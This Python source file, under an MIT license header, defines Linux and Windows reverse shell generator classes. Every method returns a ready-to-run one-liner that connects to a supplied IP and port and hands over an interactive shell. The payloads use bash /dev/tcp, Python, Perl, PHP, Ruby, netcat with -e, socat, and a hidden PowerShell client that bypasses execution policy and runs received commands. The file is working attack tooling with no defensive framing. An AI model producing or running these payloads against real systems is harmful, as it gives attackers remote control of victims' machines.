# MIT License
#
# Copyright (c) 2024 TheMuslimHacker
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


class LinuxReverseShellGenerator:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    # Bash reverse shell
    def bash_reverse_shell(self):
        return f"sh -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"

    # Python reverse shell
    def python_reverse_shell(self):
        return f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{self.ip}\",{self.port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"

    # Netcat reverse shell
    def netcat_reverse_shell(self):
        return f"nc {self.ip} {self.port} -e sh"

    # Perl reverse shell
    def perl_reverse_shell(self):
        return f"perl -e 'use Socket;$i=\"{self.ip}\";$p={self.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"

    # PHP reverse shell
    def php_reverse_shell(self):
        return f"php -r '$sock=fsockopen(\"{self.ip}\",{self.port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    # Ruby reverse shell
    def ruby_reverse_shell(self):
        return f"ruby -rsocket -e 'f=TCPSocket.open(\"{self.ip}\",{self.port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

    # Socat reverse shell
    def socat_reverse_shell(self):
        return f"socat TCP:{self.ip}:{self.port} EXEC:/bin/sh"


class WindowsReverseShellGenerator:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    # PowerShell reverse shell
    def powershell_reverse_shell(self):
        return f"powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{self.ip}', {self.port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_.ToString()}}WriteToStream ($Output)}}$StreamWriter.Close()\""

    # Netcat reverse shell
    def netcat_reverse_shell(self):
        return f"nc.exe {self.ip} {self.port} -e cmd.exe"

    # PHP reverse shell (using php.exe)
    def php_reverse_shell(self):
        return f"php.exe -r \"$sock=fsockopen('{self.ip}', {self.port});exec('cmd.exe <&3 >&3 2>&3');\""

    # Ruby reverse shell (using ruby.exe)
    def ruby_reverse_shell(self):
        return f"ruby.exe -rsocket -e \"f=TCPSocket.open('{self.ip}', {self.port}).to_i;exec sprintf('cmd.exe <&%d >&%d 2>&%d',f,f,f)\""

